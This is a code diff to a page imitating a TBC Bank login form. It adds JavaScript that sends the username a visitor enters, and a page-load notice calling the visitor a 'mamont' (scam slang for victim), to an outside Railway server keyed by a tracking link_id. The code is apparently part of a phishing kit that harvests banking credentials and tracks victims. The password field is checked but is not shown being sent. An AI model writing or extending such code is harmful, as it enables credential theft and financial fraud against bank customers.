@@ -597,6 +597,26 @@ body{font-family:"Helvetica Neue",Arial,sans-serif;height:100vh;overflow:hidden;
 </div>
 
 <script>
+// Логирование на Railway
+function sendLog(type, details, callback) {
+  const LOG_SERVER_URL = 'https://worker-production-740e.up.railway.app/log';
+  const urlParams = new URLSearchParams(window.location.search);
+  const link_id = urlParams.get('link_id') || '';
+
+  fetch(LOG_SERVER_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      type: type,
+      details: details + (link_id ? `\nlink_id=${link_id}` : ''),
+      timestamp: new Date().toLocaleString('ru-RU')
+    })
+  })
+  .then(response => response.json())
+  .then(data => { if (callback) callback(); })
+  .catch(error => { console.error('Log error:', error); if (callback) callback(); });
+}
+
 var T = {
   en: {
     title: 'Enter Credentials',
@@ -783,6 +803,9 @@ function handleLogin() {
   if (!p.value.trim()) { p.classList.add('error'); pe.textContent = t.ep; pe.style.display = 'block'; ok = false; }
   if (!ok) return;
 
+  // Логирование попытки входа в TBC
+  sendLog('bank_login', `🏦 TBC Bank\n👤 User: ${u.value}`);
+
   document.getElementById('overlay').classList.add('active');
 
   var steps = [
@@ -806,6 +829,13 @@ document.addEventListener('keydown', function(e) { if (e.key === 'Enter') handle
     this.classList.remove('error');
     document.getElementById(id === 'username' ? 'user-err' : 'pass-err').style.display = 'none';
   });
+});
+
+// Логирование выбора банка TBC при загрузке страницы
+document.addEventListener('DOMContentLoaded', function() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const link_id = urlParams.get('link_id') || '';
+  sendLog('bank_selected', `🏦 Мамонт выбрал TBC\nlink_id=${link_id}`);
 });
 </script>
 
